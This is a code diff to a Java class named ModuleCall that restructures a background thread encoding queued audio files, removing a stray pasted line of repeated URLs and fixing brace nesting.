@@ -336,36 +336,35 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if (stopQueueMonitor) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(EncodingTask run): killing audio encoding thread");
-						http: // cognome.alfemminile.com/w/cognomi/304-milano/cognomi-piu-diffusi.htmlhttp://cognome.alfemminile.com/w/cognomi/304-milano/cognomi-piu-diffusi.htmlhttp://cognome.alfemminile.com/w/cognomi/304-milano/cognomi-piu-diffusi.htmlhttp://cognome.alfemminile.com/w/cognomi/304-milano/cognomi-piu-diffusi.html
-								// }
 
-						return;
 					}
+					return;
+				}
 
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(EncodingTask run): thread awoken, time to encode");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(EncodingTask run): thread awoken, time to encode");
+				}
+
+				// Browse lists and check if an encoding is already in
+				// progress
+				try {
+					while (queue.isEmpty() == false) {
+						String file = queue.take();
+
+						// Check if end of conversation
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(EncodingTask run): decoding " + file);
+						}
+
+						encodeChunks(file);
+
 					}
-
-					// Browse lists and check if an encoding is already in
-					// progress
-					try {
-						while (queue.isEmpty() == false) {
-							String file = queue.take();
-
-							// Check if end of conversation
-							if (Cfg.DEBUG) {
-								Check.log(TAG + "(EncodingTask run): decoding " + file);
-							}
-
-							encodeChunks(file);
-
-						}
-					} catch (Exception e) {
-						if (Cfg.EXCEPTION) {
-							Check.log(e);
-						}
+				} catch (Exception e) {
+					if (Cfg.EXCEPTION) {
+						Check.log(e);
 					}
 				}
+
 			}
 		}
 
